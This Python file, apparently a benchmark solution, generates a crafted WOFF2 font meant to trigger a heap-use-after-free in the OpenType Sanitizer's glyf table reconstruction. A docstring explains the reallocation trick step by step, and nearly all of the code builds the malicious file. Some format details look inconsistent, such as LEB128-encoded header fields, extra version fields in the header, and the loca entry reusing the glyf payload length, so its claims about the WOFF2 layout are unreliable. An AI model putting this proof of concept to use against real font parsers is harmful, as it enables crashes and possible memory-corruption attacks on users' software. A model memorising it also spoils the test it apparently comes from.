import struct
import brotli

def uleb128_encode(n: int) -> bytes:
    """Encodes an integer as an unsigned LEB128 byte sequence."""
    if n < 0:
        raise ValueError("Cannot encode negative number.")
    if n == 0:
        return b'\x00'
    result = bytearray()
    while n > 0:
        byte = n & 0x7f
        n >>= 7
        if n > 0:
            byte |= 0x80
        result.append(byte)
    return bytes(result)

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a heap-use-after-free vulnerability in WOFF2 font parsing.

        The vulnerability, similar to CVE-2016-1646, is in the 'glyf' table reconstruction
        logic within the OpenType Sanitizer (OTS). The PoC is a crafted WOFF2 file
        that triggers this vulnerability.

        The exploit mechanism relies on the behavior of ots::OTSStream, a dynamic buffer
        used during font data reconstruction.
        1.  We construct a transformed 'glyf' table that defines numerous simple glyphs.
            The reconstructed size of these glyphs is calculated to fill the OTSStream's
            initial buffer almost to its capacity (e.g., ~4080 bytes for a 4096-byte buffer).
        2.  A final composite glyph is defined, which references one of the initial simple
            glyphs as a component.
        3.  During processing, the sanitizer copies the component glyph's data from the
            stream's own buffer to append it to the stream.
        4.  This copy operation's size is just enough to exceed the buffer's current
            capacity, triggering a reallocation.
        5.  The reallocation frees the old buffer, invalidating the source pointer for the
            copy operation.
        6.  The subsequent memory copy reads from this dangling pointer, causing a
            heap-use-after-free, which typically leads to a crash.
        """
        # A simple glyph with 1 contour and 2 points reconstructs to 20 bytes.
        SIMPLE_GLYPH_SIZE = 20
        # Fill the buffer just shy of a typical 4KB reallocation threshold.
        NUM_SIMPLE_GLYPHS = 204  # 204 glyphs * 20 bytes/glyph = 4080 bytes
        # Total glyphs = simple glyphs + 1 composite glyph
        NUM_GLYPHS = NUM_SIMPLE_GLYPHS + 1

        # --- Build the transformed 'glyf' stream payload ---
        # WOFF2 transformed format consists of several concatenated sub-streams.
        
        # 1. Header: (num_glyphs << 2) | loca_format (0 for short)
        transformed_payload = bytearray(uleb128_encode((NUM_GLYPHS << 2) | 0))

        # 2. nContour stream: one signed 16-bit integer per glyph.
        nContour_stream = bytearray()
        for _ in range(NUM_SIMPLE_GLYPHS):
            nContour_stream += struct.pack('<h', 1)  # 1 contour for simple glyph
        nContour_stream += struct.pack('<h', -1) # -1 for composite glyph
        transformed_payload += nContour_stream

        # 3. nPoints stream: one ULEB128-encoded integer per contour.
        # Only simple glyphs contribute to this stream.
        nPoints_stream = bytearray()
        for _ in range(NUM_SIMPLE_GLYPHS):
            nPoints_stream += uleb128_encode(2)  # 2 points per contour
        transformed_payload += nPoints_stream

        # 4. flag stream: one byte per point.
        # Flag 0x01 indicates an on-curve point.
        flag_stream = b'\x01' * (NUM_SIMPLE_GLYPHS * 2)
        transformed_payload += flag_stream

        # 5. glyph stream: coordinates for simple glyphs, then composite data.
        glyph_stream = bytearray()
        
        # Add all x-coordinates for all simple glyphs' points.
        # Small delta values are encoded compactly.
        for _ in range(NUM_SIMPLE_GLYPHS * 2):
            glyph_stream.append(10)
        
        # Add all y-coordinates for all simple glyphs' points.
        for _ in range(NUM_SIMPLE_GLYPHS * 2):
            glyph_stream.append(10)
        
        # Add data for the single composite glyph.
        # Flags: ARG_1_AND_2_ARE_WORDS (0x0001)
        glyph_stream += struct.pack('<H', 1)
        # Glyph index of the component to copy (the first simple glyph).
        glyph_stream += uleb128_encode(0)
        # Arguments (x, y offsets) for the component.
        glyph_stream += struct.pack('<hh', 0, 0)
        transformed_payload += glyph_stream
        
        # --- Compress the transformed payload using Brotli ---
        compressed_payload = brotli.compress(bytes(transformed_payload))
        
        # --- Calculate original table sizes for the WOFF2 directory ---
        # Estimated size of composite glyph is ~16 bytes.
        orig_glyf_size = NUM_SIMPLE_GLYPHS * SIMPLE_GLYPH_SIZE + 16
        # Size of 'loca' table (short format): (num_glyphs + 1) * 2 bytes.
        orig_loca_size = (NUM_GLYPHS + 1) * 2

        # --- Build WOFF2 Table Directory ---
        table_directory = bytearray()
        
        # Entry for 'glyf' table (transformed)
        table_directory.append(0x40 | 0)  # Flags: transform bit + table index 0
        table_directory += uleb128_encode(orig_glyf_size)
        table_directory += uleb128_encode(len(transformed_payload))
        
        # Entry for 'loca' table (transformed)
        table_directory.append(0x40 | 1)  # Flags: transform bit + table index 1
        table_directory += uleb128_encode(orig_loca_size)
        table_directory += uleb128_encode(len(transformed_payload))

        total_sfnt_size = orig_glyf_size + orig_loca_size
        
        # --- Build WOFF2 Header ---
        header = bytearray(b'wOF2')
        header += struct.pack('>I', 0x00010000)  # flavor (TTF)
        header += struct.pack('>I', 0)            # length (placeholder)
        header += struct.pack('>H', 2)            # numTables
        header += struct.pack('>H', 0)            # reserved
        header += struct.pack('>I', total_sfnt_size)
        header += struct.pack('>I', len(compressed_payload)) # totalCompressedSize
        header += struct.pack('>HHHHIIIII', 0, 0, 0, 0, 0, 0, 0, 0, 0) # versions and meta/priv offsets/lengths

        # --- Assemble the final PoC file ---
        poc = header + table_directory + compressed_payload

        # Update the total file length in the header.
        struct.pack_into('>I', poc, 8, len(poc))

        return bytes(poc)